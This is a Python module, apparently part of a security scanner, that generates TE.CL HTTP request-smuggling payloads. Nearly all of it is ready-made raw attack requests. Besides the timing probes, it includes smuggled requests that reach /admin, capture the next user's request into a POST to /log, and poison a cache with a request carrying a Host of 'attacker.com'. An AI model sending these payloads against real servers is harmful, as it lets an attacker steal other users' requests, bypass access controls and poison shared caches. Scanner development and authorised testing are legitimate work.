"""TE.CL (Transfer-Encoding vs Content-Length) payload generator.

In TE.CL smuggling:
- Frontend uses Transfer-Encoding: chunked to determine request boundary
- Backend uses Content-Length

The attacker sends a request where:
- Frontend processes chunked body
- Backend reads only Content-Length bytes
- Remaining data (after CL bytes) becomes prefix of next request
"""

from typing import List, Tuple
from urllib.parse import urlparse

from http_smuggler.core.models import (
    Endpoint,
    SmugglingVariant,
    DetectionMethod,
)
from http_smuggler.payloads.generator import (
    Payload,
    PayloadGenerator,
    PayloadCategory,
)
from http_smuggler.payloads.classic.cl_te import validate_hostname


class TECLPayloadGenerator(PayloadGenerator):
    """Generator for TE.CL smuggling payloads."""
    
    @property
    def variant(self) -> SmugglingVariant:
        return SmugglingVariant.TE_CL
    
    @property
    def name(self) -> str:
        return "TE.CL Payload Generator"
    
    def _extract_host_path(self, endpoint: Endpoint) -> Tuple[str, str]:
        """Extract and validate host and path from endpoint.

        Validates hostname to prevent CRLF injection and other header attacks.

        Args:
            endpoint: The endpoint to extract host/path from

        Returns:
            Tuple of (validated_host, path)

        Raises:
            ValueError: If hostname contains invalid/dangerous characters
        """
        parsed = urlparse(endpoint.url)
        hostname = parsed.hostname or ""

        # Validate hostname for injection attacks
        hostname = validate_hostname(hostname)

        # Add port if non-standard
        if parsed.port and parsed.port not in (80, 443):
            if not (1 <= parsed.port <= 65535):
                raise ValueError(f"Invalid port number: {parsed.port}")
            host = f"{hostname}:{parsed.port}"
        else:
            host = hostname

        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"

        return host, path
    
    def generate_timing_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate TE.CL timing-based detection payloads.
        
        These payloads cause a timeout if the backend uses Content-Length
        but we send chunked data that extends beyond CL bytes.
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        # Basic TE.CL timing payload
        # Frontend sees complete chunked message
        # Backend sees CL=4, reads "5c\r\n", then waits for request line
        # The "5c" (hex 92) is interpreted as start of next request
        payload1 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"  # Chunk size (92 bytes - but we only send a few)
            f"GPOST / HTTP/1.1\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        )
        
        payloads.append(Payload(
            name="TE.CL-timing-basic",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=payload1.encode(),
            description="Basic TE.CL timing payload",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Backend reads CL bytes, sees partial request, waits",
            expected_timeout=5.0,
        ))
        
        # TE.CL with small Content-Length
        # Backend only reads 0 bytes, everything after headers is smuggled
        body2 = (
            f"1\r\n"
            f"X\r\n"
            f"0\r\n"
            f"\r\n"
        )
        payload2 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: 0\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body2}"
        )
        
        payloads.append(Payload(
            name="TE.CL-timing-zero-cl",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=payload2.encode(),
            description="TE.CL with Content-Length: 0",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Backend reads 0 bytes, chunked data left in buffer",
            expected_timeout=5.0,
        ))
        
        # TE.CL where CL doesn't match first line of chunk
        payload3 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"  # This extra byte is in chunked but not CL
        )
        
        payloads.append(Payload(
            name="TE.CL-timing-cl-mismatch",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=payload3.encode(),
            description="TE.CL with CL slightly larger than terminator",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Backend tries to read 6 bytes including next request",
            expected_timeout=5.0,
        ))
        
        return payloads
    
    def generate_differential_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate TE.CL differential detection payloads.
        
        These payloads poison the next request if vulnerable, causing
        a detectably different response.
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        # Classic TE.CL differential - smuggle complete request
        # Frontend: processes complete chunked request
        # Backend: reads only CL bytes, leaving smuggled request
        smuggled = (
            f"GET /404_smuggled HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"\r\n"
        )
        chunk_data = smuggled.encode()
        chunk_size = hex(len(chunk_data))[2:]
        
        # Content-Length should cover just the chunk size line
        body = f"{chunk_size}\r\n{smuggled}0\r\n\r\n"
        # CL is set to be less than the full chunked body
        cl = 4  # Just "XX\r\n" where XX is chunk size
        
        payload1 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: {cl}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body}"
        )
        
        payloads.append(Payload(
            name="TE.CL-differential-404",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=payload1.encode(),
            description="TE.CL smuggle GET /404_smuggled",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request receives 404 response",
            poison_prefix="GET /404_smuggled",
        ))
        
        # TE.CL with GPOST poison
        # Smuggle just "G" to prefix next POST request
        smuggled2 = "G"
        chunk_size2 = hex(len(smuggled2))[2:]
        body2 = f"{chunk_size2}\r\n{smuggled2}\r\n0\r\n\r\n"
        
        payload2 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: 4\r\n"  # Just "1\r\nG" 
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body2}"
        )
        
        payloads.append(Payload(
            name="TE.CL-differential-gpost",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=payload2.encode(),
            description="TE.CL smuggle 'G' to create GPOST method",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next POST becomes GPOST",
            poison_prefix="G",
        ))
        
        # TE.CL smuggle request to /admin
        smuggled3 = (
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Smuggled: true\r\n"
            f"\r\n"
        )
        chunk_size3 = hex(len(smuggled3))[2:]
        body3 = f"{chunk_size3}\r\n{smuggled3}0\r\n\r\n"
        
        payload3 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body3}"
        )
        
        payloads.append(Payload(
            name="TE.CL-differential-admin",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=payload3.encode(),
            description="TE.CL smuggle request to /admin",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request sees /admin response",
            poison_prefix="GET /admin",
        ))
        
        # TE.CL with request capture payload
        # Smuggle a POST that captures the next request as body
        smuggled4 = (
            f"POST /log HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 500\r\n"
            f"\r\n"
            f"captured="
        )
        chunk_size4 = hex(len(smuggled4))[2:]
        body4 = f"{chunk_size4}\r\n{smuggled4}0\r\n\r\n"
        
        payload4 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body4}"
        )
        
        payloads.append(Payload(
            name="TE.CL-differential-capture",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=payload4.encode(),
            description="TE.CL smuggle request that captures next request",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request is captured as body of smuggled POST",
            poison_prefix="POST /log",
            metadata={"capture_length": 500},
        ))
        
        # TE.CL smuggle with host override for cache poisoning
        smuggled5 = (
            f"GET /static/script.js HTTP/1.1\r\n"
            f"Host: attacker.com\r\n"
            f"\r\n"
        )
        chunk_size5 = hex(len(smuggled5))[2:]
        body5 = f"{chunk_size5}\r\n{smuggled5}0\r\n\r\n"
        
        payload5 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body5}"
        )
        
        payloads.append(Payload(
            name="TE.CL-differential-cache-poison",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=payload5.encode(),
            description="TE.CL smuggle for cache poisoning",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Cache may be poisoned with attacker's response",
            poison_prefix="GET /static/script.js",
            metadata={"attack_type": "cache_poisoning"},
        ))
        
        return payloads

